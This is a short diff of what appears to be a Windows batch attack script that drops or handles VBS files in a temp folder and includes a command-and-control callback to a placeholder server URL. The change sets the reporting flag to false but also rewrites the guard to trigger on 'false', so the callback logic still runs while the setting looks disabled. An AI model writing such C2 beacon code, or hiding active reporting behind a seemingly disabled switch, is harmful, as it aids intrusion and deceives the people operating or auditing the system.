@@ -22,7 +22,7 @@ set "FULL_VBS_PATH=%TARGET_TEMP_PATH%\%VBS_FILES_PATTERN%"
 
 set "LOG_VERBOSE=true"
 set "C2_URL=http://your-c2-server.com/report"
-set "ENABLE_C2_REPORTING=true"
+set "ENABLE_C2_REPORTING=false"
 
 set "SCRIPT_OVERALL_STATUS=SUCCESS"
 set "ERROR_MESSAGES="
@@ -65,7 +65,7 @@ if defined ERROR_MESSAGES echo [!] Errors: !ERROR_MESSAGES!
 echo.
 
 REM --- C2 Callback ---
-if /I "!ENABLE_C2_REPORTING!"=="true" (
+if /I "!ENABLE_C2_REPORTING!"=="false" (
     if /I "!C2_URL!"=="http://your-c2-server.com/report" (
         echo [!] C2_REPORT_SKIPPED: Default C2_URL placeholder detected.
     ) else if "!C2_URL!"=="" (
